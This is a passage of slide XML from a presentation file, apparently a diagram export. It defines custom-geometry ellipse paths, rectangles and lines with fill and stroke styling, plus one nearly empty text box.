                  <a:pt x="146" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="266" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="278" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="288" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="309" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="313" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="319" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="319" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="313" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="309" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="288" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="278" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="266" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439" name="CustomShape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3382920" y="4037040"/>
            <a:ext cx="516960" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="326" h="65">
                <a:moveTo>
                  <a:pt x="162" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="146" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="266" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="278" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="288" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="309" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="313" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="319" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="319" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="313" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="309" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="288" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="278" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="266" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="440" name="Line 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3382920" y="4027320"/>
            <a:ext cx="1440" cy="65160"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="441" name="Line 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3900240" y="4027320"/>
            <a:ext cx="1800" cy="65160"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="CustomShape 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3382920" y="4027320"/>
            <a:ext cx="510480" cy="62640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443" name="CustomShape 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3675240" y="4054320"/>
            <a:ext cx="40680" cy="197640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1300" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1300" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="444" name="CustomShape 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3378240" y="3951360"/>
            <a:ext cx="515160" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="325" h="77">
                <a:moveTo>
                  <a:pt x="163" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="147" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="179" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="267" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="294" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="310" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="324" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="310" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="302" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="294" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="279" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="267" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="211" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="179" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="445" name="CustomShape 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3378240" y="3951360"/>
            <a:ext cx="515160" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="325" h="77">
                <a:moveTo>
                  <a:pt x="163" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="147" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="99" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="59"/>
                </a:lnTo>
                <a:lnTo>
